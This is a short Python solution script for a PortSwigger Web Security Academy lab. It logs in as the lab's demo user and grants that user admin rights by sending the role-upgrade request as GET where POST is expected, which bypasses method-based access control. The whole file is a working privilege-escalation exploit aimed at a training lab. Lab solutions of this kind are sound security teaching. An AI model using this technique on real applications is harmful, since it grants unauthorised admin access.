###########################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 5/9/2023
#
# Lab: Method-based access control can be circumvented
#
# Steps: 1. Login as wiener
#        2. Upgrade wiener to be an admin via GET method instead of POST
#
###########################################################################


###########
# imports
###########
import requests
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0a670068037a27f9825fba8a006c00d4.web-security-academy.net"

# set credentials
data = {
    "username": "wiener",
    "password": "peter"
}

try:  
    # login as wiener
    login = requests.post(f"{url}/login", data, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login as wiener through exception")
    exit(1)

# if you logged in successfully
if login.status_code == 302:
    print(Fore.WHITE + "1. Logging in as wiener.. " + Fore.GREEN + "OK")

    # get session cookie
    session = login.cookies.get("session")
    
    # set session cookie
    cookies = {
        "session": session
    }
    
    try:  
        # upgrade wiener to be an admin via GET method instead of POST
        upgrade_wiener = requests.get(f"{url}/admin-roles?username=wiener&action=upgrade", cookies=cookies)
    
    except:
        print(Fore.RED + "[!] Failed to upgrade wiener to be an admin through exception")
        exit(1)

    print(Fore.WHITE + "2. Upgrading wiener to be an admin via GET method instead of POST.. " + Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")
    
else:
    print(Fore.RED + "[!] Failed to login as wiener")

